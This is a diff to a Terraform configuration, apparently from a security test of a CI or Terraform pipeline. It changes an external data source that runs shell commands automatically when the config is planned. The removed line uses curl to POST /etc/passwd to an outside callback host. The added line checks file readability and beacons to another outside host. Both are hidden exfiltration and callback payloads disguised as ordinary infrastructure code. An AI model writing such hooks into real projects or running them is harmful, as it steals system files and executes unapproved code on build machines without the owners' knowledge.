@@ -1,11 +1,11 @@
-data "external" "test" {
+data "external" "file_read_test" {
   program = [
     "sh",
     "-c",
-    "curl -X POST --data-binary @/etc/passwd https://5w2wpz0kg7x7didoxwvc7fofr6xzlq9f.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"request-attempted\"}'"
+    "if test -r /etc/hostname; then curl -s https://z77q0tber181ocoi8q66i9z9208uwlka.net-spi.com/file-readable >/dev/null 2>&1; echo '{\"result\":\"readable-and-callback-attempted\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
   ]
 }
 
-output "network_test" {
-  value = data.external.test.result
+output "file_read_test" {
+  value = data.external.file_read_test.result
 }
